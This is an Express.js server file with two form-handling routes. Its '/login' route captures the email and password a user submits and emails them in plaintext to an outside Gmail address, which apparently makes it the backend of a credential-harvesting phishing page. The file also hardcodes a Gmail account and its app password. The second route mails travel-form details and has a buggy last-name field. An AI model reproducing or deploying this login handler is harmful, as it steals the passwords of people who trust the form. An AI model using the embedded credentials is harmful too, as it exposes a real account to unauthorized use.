// Import required modules
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");

// Create an Express application
const app = express();

// Configure bodyParser middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Add CORS middleware
app.use(cors());

// Define a route to handle form submission
app.post("/login", (req, res) => {
  // Extract form data
  const {  email, password } = req.body;

  // Create transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "ekeleagbakwuru9@gmail.com",
      pass: "asjyyxyxjpjsqdei",
    },
  });

  // Setup email data
  let mailOptions = {
    from: "ekeleagbakwuru9@gmail.com",
    to: "njusticej@gmail.com",
    subject: "New Form Submission",
    text: ` \nEmail: ${email}\nPassword: ${password}`,
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error:", error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent:", info.response);
      res.send("Email sent successfully");
    }
  });
});


// submit form from jide
app.post("/submit-form", (req, res) => {

  // Extract form data
  const {   
    firstName,
    lastName,
    email,
    budget,
    activity,
    destination  } = req.body;

  // Create transporter object using SMTP transport
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "ekeleagbakwuru9@gmail.com",
      pass: "asjyyxyxjpjsqdei",
    },
  });

  // Setup email data
  let mailOptions = {
    from: "ekeleagbakwuru9@gmail.com",
    to: "ekeleagbakwuru9@gmail.com",
    subject: "New Form Submission",
    text: `
      \nFirst Name: ${req.body.firstName}
      \nLast Name: ${req.body}
      \nEmail: ${email}
      \nBudget: ${budget}
      \nActivity: ${activity}
      \nDestination: ${destination}
    `,
  };
  

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error:", error);
      res.status(500).send("Error sending email");
    } else {
      console.log("Email sent:", info.response);
      res.send("Email sent successfully");
    }
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is runningning on port ${PORT}`);
});
